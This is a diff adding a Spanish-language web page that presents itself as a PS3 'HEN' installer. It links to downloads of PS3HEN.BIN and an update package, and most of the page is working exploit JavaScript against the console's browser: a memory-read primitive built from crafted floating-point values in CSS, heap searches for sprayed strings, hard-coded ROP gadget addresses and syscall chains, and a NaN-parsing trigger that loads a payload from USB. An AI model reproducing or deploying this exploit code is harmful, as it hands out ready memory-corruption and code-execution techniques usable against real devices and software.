@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Videogames SCZ - USB Installer</title>
+<style>
+    /* --- ESTILOS GENERALES --- */
+    body {
+        background: url('image_0.png') no-repeat center center fixed;
+        -webkit-background-size: cover;
+        background-size: cover;
+        background-color: #000000;
+        color: #00FF00;
+        font-family: monospace;
+        text-align: center;
+        margin: 0; padding: 10px;
+        text-shadow: 2px 2px 4px #000;
+        overflow-x: hidden;
+    }
+
+    /* --- LOGO --- */
+    .logo-container {
+        width: 100%;
+        text-align: center;
+        margin-bottom: 0px; 
+    }
+
+    .logo-img {
+        width: 25%;
+        max-width: 900px; 
+        height: auto;
+        display: block;
+        margin: 0 auto;
+    }
+
+    /* --- CONTENEDOR DE CONTENIDO --- */
+    .content-wrapper {
+        width: 100%;
+        margin-top: 10px; 
+    }
+    
+    /* --- TEXTOS --- */
+    .text-block {
+        display: block;
+        width: 100%;
+        margin: 5px 0; 
+    }
+
+    .warning { 
+        color: yellow; 
+        font-size: 18px; 
+        font-weight: bold;
+        background: rgba(0, 0, 0, 0.6); 
+        display: inline-block;
+        padding: 8px 20px;
+        border-radius: 50px;
+        border: 1px solid #770;
+        margin-bottom: 5px; 
+    }
+
+    .instruction { 
+        color: #fff; 
+        font-size: 22px; 
+        font-weight: bold; 
+        text-transform: uppercase;
+        background: rgba(0,0,0,0.4); 
+        display: inline-block;
+        padding: 5px 15px;
+        border-radius: 4px;
+        margin-top: 5px; 
+    }
+
+    /* --- BOTONES --- */
+    .btn-container { width: 100%; text-align: center; margin-top: 10px; }
+
+    .btn-large-green {
+        display: block;
+        width: 65%; 
+        max-width: 500px;
+        padding: 20px;
+        margin: 25px auto; 
+        background: rgba(5, 30, 5, 0.9); 
+        color: #00FF00;      
+        border: 3px solid #00FF00; 
+        font-size: 24px; 
+        font-weight: bold;
+        font-family: monospace;
+        cursor: pointer;
+        text-decoration: none;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+    }
+    
+    .btn-large-green:hover {
+        background: #00FF00;
+        color: #000000;
+        box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
+    }
+    
+    .btn-hen-trigger { 
+        font-size: 24px; 
+        padding: 20px;   
+        background: #000; 
+        margin-top: 25px; 
+        width: 65%;      
+        max-width: 500px;
+        border: 3px solid #00FF00;
+    }
+
+    .btn-large-green:disabled { border-color: #555; color: #555; background: #222; cursor: default; box-shadow: none;}
+
+    #log-area {
+        width: 70%; margin: 25px auto; border: 1px dashed #00FF00; padding: 10px;
+        min-height: 30px; text-align: left; font-size: 11px; color: #00FF00;
+        white-space: pre-wrap; word-wrap: break-word; background: rgba(0,0,0,0.8);
+    }
+
+    .hidden-stuff { display: none; }
+</style>
+</head>
+<body onload="init_ui()">
+
+    <div class="logo-container">
+        <img src="image_1.png" alt="Videogames SCZ" class="logo-img">
+    </div>
+
+    <div class="content-wrapper">
+        
+        <div class="text-block">
+            <div class="warning">INSERTA UN USB EN TU CONSOLA</div>
+        </div>
+
+        <div class="text-block">
+            <div class="instruction">PASO 1: DESCARGAR ARCHIVOS AL USB</div>
+        </div>
+        
+        <div class="btn-container">
+            <a href="https://raw.githubusercontent.com/Videogamesscz/videostore/main/downloads/PS3HEN.BIN" class="btn-large-green" download>1 - DESCARGAR PS3HEN.BIN</a>
+            <a href="https://github.com/Videogamesscz/videostore/raw/refs/heads/main/downloads/HEN_UPD.pkg" class="btn-large-green" download>1 - DESCARGAR ARCHIVO HEN UPDTATE.PKG</a>
+        </div>
+
+        <div class="text-block" style="margin-top: 20px;">
+            <div class="instruction">PASO 2: INSTALA EL HEN</div>
+        </div>
+
+        <button id="btn-hen" class="btn-large-green btn-hen-trigger" onclick="start_hen_exploit()">2. INSTALA EL HEN EN TU PS3</button>
+
+        <div id="log-area">Esperando usuario...</div>
+    </div>
+
+    <div class="hidden-stuff">
+        <div id="exploit"></div><div id="trigger"></div><div id="result"></div>
+    </div>
+
+    <script>
+        var logElem = document.getElementById('log-area');
+        var btnHen = document.getElementById('btn-hen');
+
+        function log(msg) {
+            logElem.innerHTML = "> " + msg + "\n" + logElem.innerHTML;
+        }
+
+        function init_ui() {
+            var ua = navigator.userAgent;
+            var fwv = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
+            if (!fwv) fwv = "PC/Desconocido";
+            log("FW: " + fwv);
+            log("Todo preparado.");
+        }
+
+        function start_hen_exploit() {
+            btnHen.disabled = true;
+            btnHen.innerHTML = "EJECUTANDO...";
+            btnHen.style.background = "#333";
+            log("Iniciando ejecución en el USB...");
+            setTimeout(function(){ initROP(true); }, 500);
+        }
+
+        function showResult(str) {
+            var cleanStr = str.replace(/<[^>]*>?/gm, '');
+            log(cleanStr);
+            if (str.indexOf("Failed") !== -1 || str.indexOf("failed") !== -1) {
+                btnHen.innerHTML = "FALLO - REINTENTAR";
+                btnHen.disabled = false;
+                btnHen.style.borderColor = "red";
+                btnHen.style.color = "red";
+                btnHen.style.background = "rgba(50, 0, 0, 0.9)";
+            } else if (str.indexOf("ÉXITO") !== -1 || str.indexOf("Success") !== -1) {
+                 btnHen.innerHTML = "¡ÉXITO! CERRANDO EL NAVEGADOR...";
+                 btnHen.style.borderColor = "green";
+                 btnHen.style.color = "green";
+                 btnHen.style.background = "#000";
+            }
+        }
+    </script>
+
+    <script>
+      var xtra_data, stack_frame, jump_2, jump_1, xtra_data_addr, stack_frame_addr, jump_2_addr, jump_1_addr;
+      var index_key = "DA7D4B5E499A4F53B1C1A14A7484443B";
+      var start_x = "xxxx";
+      var offset_array = [], t_out = 0;
+      var search_max_threshold = 70 * 0x100000, search_base = 0x80000000, mbytes = 1048576, search_size = 2 * mbytes;
+      var search_base_off = 0, search_size_ext = 0, gtemp_addr = 2365587456;
+      var total_loops = 0, max_loops = 20, frame_fails = 0;
+      var sp_exit = 2413354176, dbyte41 = 16705, dbyte00 = 0;
+      var toc_addr = 7296344, gadget1_addr = 620036, gadget8_addr = 131072;
+      var gadget_mod1_addr = 6352856, gadget_mod2_addr = 80756, gadget_mod3_addr = 757248;
+      var gadget_mod4a_addr = 890500, gadget_mod7_addr = 108204, gadget_mod8_addr = 2862264;
+      var gadget_mod4b_addr = 0x42c778, gadget_mod4c_addr = 0x054af0, gadget_mod15_addr = 0x39d038;
+      var gadget_mod12_addr = 0x63315c, gadget_mod9_addr = 0x010b20;
+
+      function hexdw2bin(v){return hexw2bin(0)+hexw2bin(v);}
+      function hexw2bin(v){return String.fromCharCode(v>>16)+String.fromCharCode(v);}
+      function hexh2bin(v){return String.fromCharCode(v);}
+      String.prototype.toHex16=function(){return("0000"+this).substr(-4);};
+      String.prototype.toAscii=function(h){var a="",i=0;while(i<this.length){a+=(h===true)?this.charCodeAt(i).toString(16).toHex16():this.charCodeAt(i).toString(16);i++;}return a;};
+      String.prototype.convert=function(a){if(this.length<1)return"";var s=(a===true)?this:this.toAscii();while(s.length%4!==0)s+="00";if(s.substr(s.length-3,2)!=="00")s+="0000";var r=[],i=0;while(i<s.length){r.push(String.fromCharCode(parseInt(s.substr(i,4),16)));i+=4;}return r.join("");};
+      String.prototype.convertedSize=function(a){if(this.length<1)return 0;var s=(a===true)?this:this.toAscii();while(s.length%4!==0)s+="00";if(s.substr(s.length-3,2)!=="00")s+="0000";return s.length/2;};
+      String.prototype.replaceAt=function(i,c){return this.substr(0,i)+c+this.substr(i+c.length);};
+      String.prototype.repeat=function(n){return new Array(n+1).join(this);};
+      function fromIEEE754(b,e,f){var r=0,l=[],i,j,y;for(i=b.length;i;i-=1){y=b[i-1];for(j=8;j;j-=1){l.push(y%2?1:0);y=y>>1;}}l.reverse();var s=l.join("");var z=(1<<(e-1))-1;var S=parseInt(s.substring(0,1),2)?-1:1;var E=parseInt(s.substring(1,1+e),2);var F=parseInt(s.substring(1+e),2);if(E===(1<<e)-1)r=F!==0?NaN:S*Infinity;else if(E>0)r=S*Math.pow(2,E-z)*(1+F/Math.pow(2,f));else if(F!==0)r=S*Math.pow(2,-(z-1))*(F/Math.pow(2,f));else r=S*0;var d=String(r).split(/[eE]/);if(d.length===1)return d[0];var Z="",N=r<0?"-":"",T=d[0].replace(".",""),M=Number(d[1])+1;if(M<0){Z=N+"0.";while(M++)Z+="0";return Z+T.replace(/^\-/,"");}M-=T.length;while(M--)Z+="0";return T+Z;}
+      function generateIEEE754(a,s){var h=[(a>>24)&0xff,(a>>16)&0xff,(a>>8)&0xff,a&0xff,(s>>24)&0xff,(s>>16)&0xff,(s>>8)&0xff,s&0xff];return fromIEEE754(h,11,52);}
+      function generateExploit(a,s){var n=(a<<32)|((s>>1)-1);return generateIEEE754(a,n-a);}
+      function readMemory(a,s){if(document.getElementById("exploit"))document.getElementById("exploit").style.src="local("+generateExploit(a,s)+")";}
+      function checkMemory(a,s,l){if(document.getElementById("exploit")){readMemory(a,s);return document.getElementById("exploit").style.src.substr(6,l);}}
+      function trigger(a){if(document.getElementById("trigger"))document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")");}
+      function fillN(n,v,N){var s="",i=0,t=hexh2bin(v);while(i<n/N){s+=t.repeat(N/2);i++;}return s;}
+      function f16(n,v){return fillN(n,v,16);} function f8(n,v){return fillN(n,v,8);} function f4(n,v){return fillN(n,v,4);}
+      
+      function callsub(s,r3,r4,r5,r6,r7,r8,r9,r10,r11,ss,rin,rout){var m=0x20;if(rout===null)rout=gtemp_addr;if(rin===null)rin=gtemp_addr;return(hexdw2bin(gadget_mod2_addr)+f16(0x60,dbyte41)+hexdw2bin(gtemp_addr)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+f16(0x50,dbyte41)+f4(0xc,dbyte41)+hexw2bin(r11)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+f4(0x4,dbyte41)+hexw2bin(r9)+f16(0x20,dbyte41)+hexdw2bin(r3)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+f16(0x60,dbyte41)+hexdw2bin(rin)+f16(0x10,dbyte41)+hexdw2bin(s)+f16(ss-m,dbyte00)+hexdw2bin(rout)+hexdw2bin(sp_exit)+f8(0x8,dbyte41));}
+      function syscall(s,r3,r4,r5,r6,r7,r8,r9,r10,rout){if(rout===null)rout=gtemp_addr;return(hexdw2bin(gadget_mod2_addr)+f16(0x60,dbyte41)+hexdw2bin(gtemp_addr)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+f16(0x50,dbyte41)+f4(0xc,dbyte41)+hexw2bin(s)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+f4(0x4,dbyte41)+hexw2bin(r9)+f16(0x20,dbyte41)+hexdw2bin(r3)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+f16(0x60,dbyte41)+hexdw2bin(gtemp_addr)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+f16(0x60,dbyte41)+hexdw2bin(rout)+hexdw2bin(sp_exit)+f8(0x8,dbyte41));}
+      function syscall_r3r5_p2p(s,r3,r4,r5,r6,r7,r8,r9,r10,rout){if(rout===null)rout=gtemp_addr;return(hexdw2bin(gadget_mod2_addr)+f16(0x60,dbyte41)+hexdw2bin(gtemp_addr)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+f16(0x50,dbyte41)+f4(0xc,dbyte41)+hexw2bin(s)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+f4(0x4,dbyte41)+hexw2bin(r4)+f4(0x4,dbyte41)+hexw2bin(r9)+f16(0x10,dbyte41)+hexdw2bin(r5-0x4)+hexdw2bin(gtemp_addr)+f8(0x18,dbyte41)+hexdw2bin(gadget_mod4c_addr)+f16(0xB0,dbyte41)+hexdw2bin(r3)+f16(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+f16(0x60,dbyte41)+hexdw2bin(rout)+hexdw2bin(sp_exit)+f8(0x8,dbyte41));}
+      function stack_frame_hookup(){return(unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+f16(0x20,dbyte41)+hexdw2bin(toc_addr)+f16(0x70,dbyte41));}
+      function stack_frame_swap(n){return(hexdw2bin(gadget_mod2_addr)+f16(0x60,dbyte41)+hexdw2bin(gtemp_addr)+hexdw2bin(n)+f8(0x8,dbyte41)+hexdw2bin(gadget_mod9_addr));}
+      function findJsVariableOffset(n,d,b,s){readMemory(b,s);var dat=document.getElementById("exploit").style.src.substr(6,s);var i=0,k,m,ea;while(i<dat.length*2){if(dat.charCodeAt(i/2)===d.charCodeAt(0)){m=0;for(k=0;k<d.length*2;k+=2){if(dat.charCodeAt((i+k)/2)!==d.charCodeAt(k/2))break;m++;}if(m===d.length){ea=b+i+4;for(var t=0;t<offset_array.length;t++)if(offset_array[t]===ea)return-1;offset_array.push(ea);return ea;}}i+=0x10;}return 0;}
+      function strncmp(str1, str2, n) { str1 = str1.substring(0, n); str2 = str2.substring(0, n); return str1 == str2 ? 0 : str1 > str2 ? 1 : -1; }
+
+      function load_check() {
+        if (total_loops < max_loops) {
+          t_out = setTimeout(initROP, 500, false);
+        } else {
+          total_loops = 0; showResult("Failed (Timeout)"); t_out = 0;
+        }
+      }
+      function load_check2() {
+        if (total_loops < max_loops) {
+          t_out = setTimeout(initROP2, 500, false);
+        } else {
+          total_loops = 0; showResult("Failed (Timeout 2)"); t_out = 0;
+        }
+      }
+
+      function rop_exit_hen(fail) {
+        var chk = "53434500";
+        var chk2 = checkMemory(0x8a000000, 0x10, 3);
+        chk2 = chk2.toAscii(true);
+        if (strncmp(chk, chk2, 4) != 0) {
+          showResult("Verificación falló. Reintentando método 2...");
+          initROP2(true);
+        } else {
+          showResult("¡ÉXITO! HEN Activado. Cerrando navegador...");
+          setTimeout(function(){ window.close(); }, 3000);
+        }
+      }
+
+      function initROP(init) {
+        try {
+          if (init === true) { frame_fails=0; search_base_off=0; search_size_ext=0; total_loops=0; }
+          if (t_out) { clearTimeout(t_out); t_out=0; }
+          offset_array=[]; xtra_data_addr=0; stack_frame_addr=0; jump_2_addr=0; jump_1_addr=0;
+          var usb_fp_addr=0, index_key_addr=0;
+          search_max_threshold = 70 * 0x100000; search_base = 0x80100000;
+          search_size = 2 * mbytes; search_base_off = 0 * mbytes; search_size_ext = 0 * mbytes;
+          total_loops++;
+
+          var usb_sp = "/dev_usb000/PS3HEN.BIN"; 
+
+          xtra_data = start_x.convert() + usb_sp.convert() + index_key.convert(true) + unescape("\uFD7E");
+          while (xtra_data_addr === 0) {
+            if (search_max_threshold < search_size) { return load_check(); }
+            xtra_data = xtra_data.replaceAt(0, hexh2bin(0x7efd));
+            xtra_data_addr = findJsVariableOffset("xtra_data", xtra_data, search_base, search_size);
+            search_max_threshold -= search_size;
+          }
+
+          usb_fp_addr = xtra_data_addr + start_x.convertedSize() - 0x4;
+          stack_frame = stack_frame_hookup() + 
+            syscall(0x321, usb_fp_addr, 0, 0x8e000000, 0, 0, 0, 0, 0) +
+            syscall_r3r5_p2p(0x322, 0x8e000000, 0x8a000000, 0x300000, 0x8e000008, 0, 0, 0, 0, 0, 0) +
+            stack_frame_swap(0x8a000000);
+
+          while (stack_frame_addr === 0) {
+            if (search_max_threshold < search_size + search_size_ext) {
+                frame_fails++; if (frame_fails % 10 === 0) { search_base_off += 0; search_size_ext += 0; } return load_check();
+            }
+            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2a2f));
+            stack_frame_addr = findJsVariableOffset("stack_frame", stack_frame, search_base + search_base_off, search_size + search_size_ext);
+            if (stack_frame_addr == -1) { if (search_max_threshold < search_size + search_size_ext) { frame_fails++; return load_check(); } }
+            search_max_threshold -= search_size + search_size_ext;
+          }
+
+          jump_2 = unescape("\u0102\u7EFB") + f16(0x30, 0x8282) + hexw2bin(stack_frame_addr) + unescape("\uFB7E");
+          while (jump_2_addr === 0) {
+            if (search_max_threshold < search_size) return load_check();
+            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7efb));
+            jump_2_addr = findJsVariableOffset("jump_2", jump_2, search_base, search_size);
+            if (jump_2_addr == -1) if (search_max_threshold < search_size) return load_check();
+            search_max_threshold -= search_size;
+          }
+
+          jump_1 = unescape("\u4141\u7EFA") + hexw2bin(jump_2_addr) + unescape("\uFA7E");
+          while (jump_1_addr === 0) {
+            if (search_max_threshold < search_size) return load_check();
+            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7efa));
+            jump_1_addr = findJsVariableOffset("jump_1", jump_1, search_base, search_size);
+            if (jump_1_addr == -1) if (search_max_threshold < search_size) return load_check();
+            search_max_threshold -= search_size;
+          }
+
+          var sf = checkMemory(stack_frame_addr - 0x4, 0x8000, stack_frame.length);
+          var x = checkMemory(xtra_data_addr - 0x4, 0x1000, xtra_data.length);
+          var j2 = checkMemory(jump_2_addr - 0x4, 0x1000, jump_2.length);
+          var j1 = checkMemory(jump_1_addr - 0x4, 0x1000, jump_1.length);
+
+          if (j2 === jump_2 && j1 === jump_1 && x === xtra_data && sf === stack_frame) {
+            if (t_out) clearTimeout(t_out); triggerX();
+          } else { load_check(); }
+        } catch (e) { showResult("Error: " + e); }
+      }
+
+      function initROP2(init) {
+        try {
+          if (init === true) { frame_fails=0; search_base_off=0; search_size_ext=0; total_loops=0; }
+          if (t_out) { clearTimeout(t_out); t_out=0; }
+          offset_array=[]; stack_frame_addr=0; jump_2_addr=0; jump_1_addr=0;
+          search_max_threshold = 70 * 0x100000; search_base = 0x80100000;
+          search_size = 2 * mbytes; search_base_off = 0 * mbytes; search_size_ext = 0 * mbytes;
+          total_loops++;
+          stack_frame = stack_frame_hookup() + stack_frame_swap(0x8a060000);
+          while (stack_frame_addr === 0) {
+            if (search_max_threshold < search_size + search_size_ext) { frame_fails++; if (frame_fails % 10 === 0) { search_base_off += 0; search_size_ext += 0; } return load_check2(); }
+            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2a2f));
+            stack_frame_addr = findJsVariableOffset("stack_frame", stack_frame, search_base + search_base_off, search_size + search_size_ext);
+            if (stack_frame_addr == -1) if (search_max_threshold < search_size + search_size_ext) { frame_fails++; return load_check2(); }
+            search_max_threshold -= search_size + search_size_ext;
+          }
+          jump_2 = unescape("\u0102\u7EFB") + f16(0x30, 0x8282) + hexw2bin(stack_frame_addr) + unescape("\uFB7E");
+          while (jump_2_addr === 0) {
+            if (search_max_threshold < search_size) return load_check2();
+            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7efb));
+            jump_2_addr = findJsVariableOffset("jump_2", jump_2, search_base, search_size);
+            if (jump_2_addr == -1) if (search_max_threshold < search_size) return load_check2();
+            search_max_threshold -= search_size;
+          }
+          jump_1 = unescape("\u4141\u7EFA") + hexw2bin(jump_2_addr) + unescape("\uFA7E");
+          while (jump_1_addr === 0) {
+            if (search_max_threshold < search_size) return load_check2();
+            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7efa));
+            jump_1_addr = findJsVariableOffset("jump_1", jump_1, search_base, search_size);
+            if (jump_1_addr == -1) if (search_max_threshold < search_size) return load_check2();
+            search_max_threshold -= search_size;
+          }
+          var sf = checkMemory(stack_frame_addr - 0x4, 0x8000, stack_frame.length);
+          var j2 = checkMemory(jump_2_addr - 0x4, 0x1000, jump_2.length);
+          var j1 = checkMemory(jump_1_addr - 0x4, 0x1000, jump_1.length);
+          if (j2 === jump_2 && j1 === jump_1 && sf === stack_frame) {
+            if (t_out) clearTimeout(t_out); setTimeout(trigger, 1000, jump_1_addr);
+          } else { load_check2(); }
+        } catch (e) { showResult("Error initROP2: " + e); }
+      }
+
+      function triggerX() {
+        setTimeout(trigger, 1000, jump_1_addr);
+        setTimeout(rop_exit_hen, 4500, "Failed");
+        t_out = 0;
+        total_loops = 0;
+      }
+    </script>
+</body>
+</html>
